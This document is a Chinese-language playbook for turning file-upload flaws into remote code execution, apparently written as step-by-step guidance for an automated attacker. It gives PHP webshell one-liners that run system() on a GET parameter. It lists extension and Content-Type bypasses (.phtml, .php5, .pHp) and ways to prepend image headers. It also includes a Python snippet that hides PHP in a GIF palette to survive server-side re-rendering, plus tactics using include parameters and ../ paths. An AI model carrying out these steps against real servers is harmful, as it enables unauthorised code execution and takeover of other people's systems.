# File Upload / RCE Webshell

## 判定原则
- 产出必须是完整链路：上传请求 → 落地路径 → 访问/执行 URL → 验证命令。只给 PHP 代码视为失败。
- 先试最直接路径：传 .php 并访问；被拒后按拒绝信号选择绕过。

## 1. 完全无校验（扩展名/MIME/内容均不检查）
信号：上传 .php 后响应成功；没有格式或类型错误；服务端直接 move_uploaded_file 到可预测目录。
动作：multipart POST 传 pwn.php，Content-Type 可设为 image/jpeg。落地后访问该文件并带 ?c=id 或 ?cmd=id 验证执行。
最小示例：文件内容 `<?php echo "X"; system($_GET["c"]);?>`。
停止/换思路：访问 404 时先确认上传目录是否存在；若目录缺失则先创建/检查，再上传。返回源码不执行时改可解析后缀 .php5/.phtml 或找解析路径。

## 2. 扩展名/Content-Type 校验
信号：上传 .php 被拒绝；.jpg 可成功；或响应提示 MIME 不合法。
动作：优先改可解析后缀 .phtml、.php5、.pht、.pHp；Content-Type 设为 image/jpeg 或 image/gif。如果仅检测文件头，保留真实图像头后接 PHP。
停止：可解析后缀全部被封且无包含点，停止在该上传点堆 payload。

## 3. 服务端二次渲染（GD/ImageMagick 重新生成图片）
信号：上传后落地文件大小或内容发生变化；文件尾追加 PHP 后不存活；服务端行为显示使用 imagecreatefromgif 加 imagegif 等重写图片。
动作：优先用 GIF 承载。把 PHP 写入 256 色 GIF 的全局调色板(GCT) 768 字节中，不足补 null；像素索引指向这些调色板项。上传后访问落地文件或通过已有 PHP 文件包含它，用 ?c=id 验证。
最小示例：`php=b'<?php echo "OK"; system($_GET[c]);?>'; pal=bytearray(php)+b'\x00'*(768-len(php)); im=Image.new('P',(13,1)); im.putpalette(bytes(pal)); [im.putpixel((i,0),i) for i in range(13)]; im.save('carrier.gif','GIF')`。
停止/换思路：如果落地后缀为 .gif 且目录不解析，不要继续在文件尾追加；必须让落地后缀为 .php 或找 include 参数包含该文件。

## 4. 图像头校验（getimagesize/exif_imagetype）
信号：非图片内容被拒，但改后缀可上传；服务端调用 getimagesize 或 exif_imagetype。
动作：保留真实图像头（如 GIF89a）后接 PHP；若后缀可解析则直接访问执行，否则组合包含。
停止：如果 .gif 落地不解析，找包含点或重命名为 .php。

## 5. 包含点/路径可控
信号：上传成功但访问目录不解析 PHP；存在 include、file、page 参数或保存路径/文件名可控。
动作：把上传文件路径接入包含参数；或通过文件名 ../ 控制落点；控制后缀为 .php。
停止：无包含点且路径不可控，换其他上传点。